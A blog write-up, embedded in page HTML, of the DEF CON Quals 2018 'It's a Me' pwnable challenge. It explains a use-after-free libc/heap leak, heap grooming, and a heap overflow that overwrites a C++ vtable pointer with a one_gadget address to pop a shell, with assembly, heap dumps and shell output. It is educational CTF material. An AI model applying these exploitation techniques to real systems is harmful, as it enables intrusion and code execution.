@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>DEF CON Quals 2018: It&#39;s a Me | Tack, Hunt, Pool</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="writeups" />
+  
+  
+  <meta name="description" content="Category: pwnable      |      Points: 124      |      Solves: 49      |      Challenge files 1234567&gt; checksec mario[*] &#x27;&#x2F;home&#x2F;raywang&#x2F;ctf&#x2F;DEFCONQ2018&#x2F;mario&#x27;    Arch:     amd64-64-little">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DEF CON Quals 2018: It&#39;s a Me">
+<meta property="og:url" content="http://raywang.tech/2018/05/14/DEF-CON-Quals-2018-It-s-a-Me/index.html">
+<meta property="og:site_name" content="Tack, Hunt, Pool">
+<meta property="og:description" content="Category: pwnable      |      Points: 124      |      Solves: 49      |      Challenge files 1234567&gt; checksec mario[*] &#x27;&#x2F;home&#x2F;raywang&#x2F;ctf&#x2F;DEFCONQ2018&#x2F;mario&#x27;    Arch:     amd64-64-little">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2018-05-15T02:39:05.000Z">
+<meta property="article:modified_time" content="2024-08-29T06:03:14.438Z">
+<meta property="article:author" content="Ray Wang">
+<meta property="article:tag" content="writeups">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Tack, Hunt, Pool" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/favicon.ico">
+  <!-- <link href="https://fonts.googleapis.com/css?family=Droid+Sans:400,700|Ubuntu+Mono:400" rel="stylesheet"> -->
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.9.0/katex.min.css" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+<script src="/js/jquery-3.1.1.min.js"></script>
+
+
+  
+  
+<script src="/libs/justifiedgallery/jquery.justifiedGallery.min.js"></script>
+
+  
+<link rel="stylesheet" href="/libs/justifiedgallery/justifiedGallery.min.css">
+
+
+
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    
+<link rel="stylesheet" href="/css/dialog.css">
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+
+          <div class="container">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            <div class="navbar-collapse collapse">
+              <ul class="nav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/categories">Categories</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/about">About</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+</div>
+</li>
+            </div>
+          </div>
+
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-DEF-CON-Quals-2018-It-s-a-Me"
+  
+  style="width: 75%; float:left;"
+  class="article article-type-post" itemscope itemprop="blogPost" >
+  <!-- Back button -->
+  
+  <a href="javascript:history.go(-1)" class="back-button-link"><span class="back-button-icon"></span> Back</a>
+  
+
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      DEF CON Quals 2018: It&#39;s a Me
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/05/14/DEF-CON-Quals-2018-It-s-a-Me/" class="article-date">
+	  <time datetime="2018-05-15T02:39:05.000Z" itemprop="datePublished">05-14-2018</time>
+	</a>
+
+      
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><p><strong>Category:</strong> pwnable      |      <strong>Points:</strong> 124      |      <strong>Solves:</strong> 49      |      <a href="https://github.com/wangray/ctf_dump/tree/master/DEFCONQ2018/itsame"><strong>Challenge files</strong></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; checksec mario</span><br><span class="line">[*] &#x27;/home/raywang/ctf/DEFCONQ2018/mario&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<h2 id="summary"><a class="markdownIt-Anchor" href="#summary"></a> Summary</h2>
+<p>This is a classic C++ menu challenge that features a UAF and heap overflow with a vtable pointer overwrite. The main heap techniques involve using a free unsorted bin chunk to leak a libc and heap address, as well as some feng shui to place an object in an overflow-able region on the heap. <a href="https://fortenf.org/e/">fortenforge</a>, <a href="https://qzqxq.wordpress.com/">qzqxq</a>, and I combined to reverse the binary and discover the 3 separate vulnerabilities.</p>
+<p><escape><span id="more"></span></escape></p>
+<h2 id="reversing"><a class="markdownIt-Anchor" href="#reversing"></a> Reversing</h2>
+<p>When you first create a new Customer or login to this pizza kitchen, you have the option to <code>order</code>, <code>cook</code>, or <code>admire</code> Pizzas. When you order, you can specify Unicode emoji ingredients like 🍍 and 🍅. If you try to order a pizza with 🍍, you are kicked out and banned from ever logging in again.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Wellcom my friende!! It&#x27;s-a me, Mario! Ready for pizza italiana vera?</span><br><span class="line">------------------- MAIN MENU -------------------</span><br><span class="line">(N)ew customer</span><br><span class="line">(L)ogin as customer</span><br><span class="line">(E)xit</span><br><span class="line">Choice: N</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; Welcome ghostly</span><br><span class="line">------------------- USER MENU -------------------</span><br><span class="line">(O)rder more pizzas</span><br><span class="line">(C)ook all pizzas</span><br><span class="line">(A)dmire cooked pizzas</span><br><span class="line">(L)eave</span><br><span class="line">Choice:</span><br></pre></td></tr></table></figure>
+<p>When you ask to have your pizzas cooked, the ingredients are <code>strcat</code>ed together and checked with <code>strstr</code> — if a pizza contains only 🍅, it’s “good”, if it has 🍍, it’s “criminal” — then, a new Pizza object of the correct type is created. You can also provide an explanation string, which is <code>malloc</code>ed onto the heap and stored in the Customer. This explanation is then freed at the end of <code>cook</code>, if the number of good pizzas == total number of pizzas.</p>
+<p>In pseudo-code, the Customer struct looks like</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Customer &#123;</span><br><span class="line">  +0 name ptr</span><br><span class="line">  +8 vector of ordered pizzas</span><br><span class="line">  +32 explanation ptr</span><br><span class="line">  +40 vector of cooked pizzas</span><br><span class="line">  +65 isBanned</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="stage-1-leak"><a class="markdownIt-Anchor" href="#stage-1-leak"></a> Stage 1: Leak</h2>
+<p>You want to trick Mario into cooking a pineapple pizza first. We make a pizza with <a href="https://github.com/wangray/ctf_dump/blob/467711427be117f0faaf9a8bd88c486410efa991/DEFCONQ2018/itsame/mario.py#L113">two ingredients</a>, one ending in <code>\xf0\x9f</code> and another starting with <code>\x8d\x8d</code> that, when <code>strcat</code>ed together, give a Unicode pineapple (<code>\xf0\x9f\x8d\x8d</code>). Now you’ve made Mario upset! Your customer is then stored as a global variable <code>upset_user</code>. You also unlock a menu option to print the <code>explanation</code> field, which would be a UAF if the <code>explanation</code> were freed in <code>cook</code>. We can ensure that the explanation is freed by overflowing the 1-byte counter of total number of pizzas, with (16 bad + 1 good pizza) = 17 total pizzas % 16 = 1 total pizza.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int angry_leak()</span><br><span class="line">&#123;</span><br><span class="line">  printf(</span><br><span class="line">    &quot;your friend %s ordered a pizza with %s and I should stay calm?\n&quot;,</span><br><span class="line">    *(_QWORD *)&amp;upset_user-&gt;nameptr,</span><br><span class="line">    &amp;pineapple);</span><br><span class="line">  printf(</span><br><span class="line">    &quot;&#x27;That must be a mistake&#x27;, you may say. But I asked, and this is what he had to say: %s\n&quot;,</span><br><span class="line">    *(_QWORD *)&amp;upset_user-&gt;explanation);</span><br><span class="line">  return puts(&quot;niente scuse&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>What are the contents of a freed chunk that we can leak? If the chunk is &gt;fastbin size (&gt;0x80), when it is freed, it will be inserted into the unsorted bin, which is a doubly-linked list of recently freed chunks. The <code>fd</code> and <code>bk</code> pointers will thus be populated with the address of the unsorted bin, which is in the <a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_state.html"><code>main_arena</code> struct</a> in libc. This gives us our <a href="https://github.com/wangray/ctf_dump/blob/467711427be117f0faaf9a8bd88c486410efa991/DEFCONQ2018/itsame/mario.py#L122">libc leak.</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x555555773120: 0000000000000000 0000000000000111 | &lt;--  explanation chunk. size of explanation chunk=0x111</span><br><span class="line">0x555555773130: 00007FFFF7839C78 00007FFFF7839C78 | &lt;--- fd and bk pointers, both &amp;unsorted bin</span><br><span class="line">0x555555773140: 5151515151515151 5151515151515151 | QQQQQQQQQ&gt; &lt;---- explanation data</span><br><span class="line">0x555555773150: 5151515151515151 5151515151515151 | QQQQQQQQQ&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>We can also get a <a href="https://github.com/wangray/ctf_dump/blob/467711427be117f0faaf9a8bd88c486410efa991/DEFCONQ2018/itsame/mario.py#L117">heap leak</a> if the unsorted bin has another chunk when we free our explanation. In that case, when the explanation chunk is inserted, the <code>fd</code> pointer will be set to the other free chunk. The free <code>explanation</code> chunk then looks as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x555555773120: 0000000000000000 0000000000000111 | &lt;-- explanation chunk</span><br><span class="line">0x555555773130: 00005555557740C0 00007FFFF7839B78 | &lt;--- fd ptr to next chunk, bk ptr to &amp;unsorted bin</span><br><span class="line">0x555555773140: 5151515151515151 5151515151515151 | QQQQQQQQQ&gt;</span><br><span class="line">0x555555773150: 5151515151515151 5151515151515151 | QQQQQQQQQ&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p><a href="https://docs.google.com/drawings/d/1Kf_eg7uB2mRjSOasTc4dIu5fuBpTAK0GxbnKVTkZd0Y/pub?w=1217&amp;h=865">This image</a> from sploitfun is great for understanding the linked list structure of heap bins.</p>
+<h2 id="stage-2-overflow"><a class="markdownIt-Anchor" href="#stage-2-overflow"></a> Stage 2: Overflow</h2>
+<p>If we successfully cook a pineapple pizza, we are also given a new menu option to “explain ourselves” by overwriting our explanation. It reads 300 bytes into the explanation on the heap, even though our explanation was previously <code>malloc</code>ed with a smaller length (the length of our original explanation). IDA can’t detect/decompile jump tables for some reason, so here’s the assembly of the overflow:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000020BB                 cmp     [rbp+var_1], 0</span><br><span class="line">.text:00000000000020BF                 jz      loc_2154</span><br><span class="line">.text:00000000000020C5                 lea     rdi, aLastChanceExpl ; &quot;last chance, explain yourself: &quot;</span><br><span class="line">.text:00000000000020CC                 mov     eax, 0</span><br><span class="line">.text:00000000000020D1                 call    printf</span><br><span class="line">.text:00000000000020D6                 lea     rax, global_customer</span><br><span class="line">.text:00000000000020DD                 mov     rax, [rax]</span><br><span class="line">.text:00000000000020E0                 mov     rax, [rax+20h]</span><br><span class="line">.text:00000000000020E4                 mov     esi, 300 &lt;-------- length</span><br><span class="line">.text:00000000000020E9                 mov     rdi, rax &lt;-------- explanation pointer</span><br><span class="line">.text:00000000000020EC                 call    another_fread</span><br><span class="line">.text:00000000000020F1                 lea     rdi, aTooBadNoExplan ; &quot;too bad, no explanation is reasonable. &quot;...</span><br><span class="line">.text:00000000000020F8                 call    puts</span><br><span class="line">.text:00000000000020FD                 lea     rax, global_customer</span><br><span class="line">.text:0000000000002104                 mov     rax, [rax]</span><br><span class="line">.text:0000000000002107                 mov     byte ptr [rax+41h], 1</span><br><span class="line">.text:000000000000210B                 jmp     short loc_2154</span><br></pre></td></tr></table></figure>
+<p>This overflow allows us to overwrite whatever is after the explanation in the heap. With some grooming, we can try to get a Pizza object placed right after our explanation, so we can overwrite its contents — namely, the C++ vtable pointers for class functions.</p>
+<p>A Pizza on the heap looks like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x5555557731C0: 0000000000000000 0000000000000041 | ........A&gt; &lt;---- Pizza chunk. size of Pizza chunk=0x41</span><br><span class="line">0x5555557731D0: 000055555575FC00 0000555555773210 | ..uUUU...&gt; &lt;---- ptr to ingredients</span><br><span class="line">                      ^                 </span><br><span class="line">                      |</span><br><span class="line">                      ptr to a &quot;printPizza&quot; function</span><br></pre></td></tr></table></figure>
+<p>The goal, of course, is to overwrite the printPizza vtable ptr to a pointer to <code>one_gadget</code>, so that the next time we print the pizza in <code>admire,</code> we get a shell.</p>
+<p>How do we ensure that the Pizza is placed right after our Customer’s explanation? If we <code>malloc</code>  and <code>free</code> a large explanation, its free space will be used for other objects, and if we are lucky, a Pizza.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x555555773120: 0000000000000000 0000000000000041 | ........A&gt; &lt;---- Customer&#x27;s explanation chunk</span><br><span class="line">0x555555773130: 00005555557731A0 00005555557731C0 | .1wUUU...&gt;</span><br><span class="line">0x555555773140: 00005555557731C0 0000555555773170 | .1wUUU..p&gt;</span><br><span class="line">0x555555773150: 0000555555773190 0000555555773190 | .1wUUU...&gt;</span><br><span class="line">0x555555773160: 4646464646464646 0000000000000031 | FFFFFFFF1&gt;</span><br><span class="line">0x555555773170: 0000555555773180 0000000000000004 | .1wUUU...&gt;       Other junk</span><br><span class="line">0x555555773180: 46464600858D9FF0 4646464646464646 | .....FFFF&gt;</span><br><span class="line">0x555555773190: 4646464646464646 0000000000000031 | FFFFFFFF1&gt;</span><br><span class="line">0x5555557731A0: 00005555557731B0 0000000000000004 | .1wUUU...&gt;</span><br><span class="line">0x5555557731B0: 46464600858D9FF0 4646464646464646 | .....FFFF&gt;</span><br><span class="line">0x5555557731C0: 4646464646464646 0000000000000041 | FFFFFFFFA&gt; &lt;---- Pizza object&#x27;s heap chunk</span><br><span class="line">0x5555557731D0: 000055555575FC00 0000555555773210 | ..uUUU...&gt; &lt;---- Pizza object</span><br></pre></td></tr></table></figure>
+<p>Lovely! Now, we <a href="https://github.com/wangray/ctf_dump/blob/467711427be117f0faaf9a8bd88c486410efa991/DEFCONQ2018/itsame/mario.py#L149">perform our overflow</a>, first writing <code>one_gadget</code> to the heap, then overflowing the Pizza with the heap ptr to <code>one_gadget</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x555555773120: 0000000000000000 0000000000000041 | ........A&gt;</span><br><span class="line">0x555555773130: 00007FFFF74BA26A 00007FFFF74BA26A | j.K.....j&gt; &lt;---- address of one_gadget     &lt;-----|      </span><br><span class="line">0x555555773140: 5A5A5A5A5A5A5A5A 5A5A5A5A5A5A5A5A | ZZZZZZZZZ&gt;                                       |</span><br><span class="line">...                                                                                                  |</span><br><span class="line">0x5555557731C0: 5A5A5A5A5A5A5A5A 5A5A5A5A5A5A5A5A | ZZZZZZZZZ&gt; &lt;---- Pizza object&#x27;s heap chunk       |</span><br><span class="line">0x5555557731D0: 0000555555773130 0000555555773130 | 01wUUU..0&gt; &lt;---- Overwritten vtable ptr, points to</span><br></pre></td></tr></table></figure>
+<p>And when <code>admire</code> is called,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">------------------- USER MENU -------------------</span><br><span class="line">(O)rder more pizzas</span><br><span class="line">(C)ook all pizzas</span><br><span class="line">(A)dmire cooked pizzas</span><br><span class="line">(L)eave</span><br><span class="line">Choice:</span><br><span class="line"> Admire these beauties... (3)</span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">                  ___</span><br><span class="line">                  |  ~~--.</span><br><span class="line">                  |%=@%%/</span><br><span class="line">                  |o%%%/</span><br><span class="line">               __ |%%o/</span><br><span class="line">         _,--~~ | |(_/ ._</span><br><span class="line">      ,/&#x27;  m%%%%| |o/ /  `\.</span><br><span class="line">     /&#x27; m%%o(_)%| |/ /o%%m `\</span><br><span class="line">   /&#x27; %%@=%o%%%o|   /(_)o%%% `\</span><br><span class="line">  /  %o%%%%%=@%%|  /%%o%%@=%%  \</span><br><span class="line"> |  (_)%(_)%%o%%| /%%%=@(_)%%%  |</span><br><span class="line"> | %%o%%%%o%%%(_|/%o%%o%%%%o%%% |</span><br><span class="line"> | %%o%(_)%%%%%o%(_)%%%o%%o%o%% |</span><br><span class="line"> |  (_)%%=@%(_)%o%o%%(_)%o(_)%  |</span><br><span class="line">  \ ~%%o%%%%%o%o%=@%%o%%@%%o%~ /</span><br><span class="line">   \. ~o%%(_)%%%o%(_)%%(_)o~ ,/</span><br><span class="line">     \_ ~o%=@%(_)%o%%(_)%~ _/</span><br><span class="line">       `\_~~o%%%o%%%%%~~_/&#x27;</span><br><span class="line">          `--..____,,--&#x27;</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">$ cat flag</span><br><span class="line">OOO&#123;cr1m1n4l5_5h0uld_n07_b3_r3w4rd3d_w17h_fl4gs&#125;</span><br></pre></td></tr></table></figure>
+<p>I learned the unsorted bin leak trick from Samurai’s Gulshan Singh in one of his <a href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/">writeups</a>, who in turn learned it from PPP.</p>
+<h2 id="references"><a class="markdownIt-Anchor" href="#references"></a> References</h2>
+<ol>
+<li><a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_state.html">https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_state.html</a></li>
+<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a></li>
+</ol>
+
+      
+    </div>
+    
+      <footer class="article-footer">
+        
+          
+	<section id="comments" class="comment">
+	  <div id="disqus_thread">
+	  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+	  </div>
+	</section>
+
+	<script type="text/javascript">
+	var disqus_shortname = 'wangray';
+	(function(){
+	  var dsq = document.createElement('script');
+	  dsq.type = 'text/javascript';
+	  dsq.async = true;
+	  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	}());
+	(function(){
+	  var dsq = document.createElement('script');
+	  dsq.type = 'text/javascript';
+	  dsq.async = true;
+	  dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
+	  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	}());
+	</script>
+
+
+
+        
+        
+          
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeups/" rel="tag">writeups</a></li></ul>
+
+        
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/05/27/Sunset-of-Eden-Sci-Fi-Short-Story-based-on-The-Three-Body-Problem/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">
+        
+          Sunset of Eden: Sci-Fi Short Story Based on the Three-Body Problem
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/01/23/My-Favorite-Films-of-All-Time/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">My Favorite Films of All Time</div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    
+      <strong class="toc-title">Contents</strong>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-number">1.</span> <span class="toc-text"> Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reversing"><span class="toc-number">2.</span> <span class="toc-text"> Reversing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stage-1-leak"><span class="toc-number">3.</span> <span class="toc-text"> Stage 1: Leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stage-2-overflow"><span class="toc-number">4.</span> <span class="toc-text"> Stage 2: Overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#references"><span class="toc-number">5.</span> <span class="toc-text"> References</span></a></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      <div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2024 Ray Wang. All Rights Reserved.</p>
+	</div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+
+
+  
+<script src="/js/dialog.js"></script>
+
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-104530975-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+  
+<script src="/libs/justifiedgallery/jquery.justifiedGallery.min.js"></script>
+
+  
+<link rel="stylesheet" href="/libs/justifiedgallery/justifiedGallery.min.css">
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/bootstrap.js"></script>
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              Toggle font size
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            Toggled font size
+          </div>
+        </div>
+
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              Toggle night view
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            Press again to switch views
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;About&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            Tack, Hunt, Pool
+          </div>
+          <div class="panel-body">
+            Copyright © 2024 Ray Wang All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
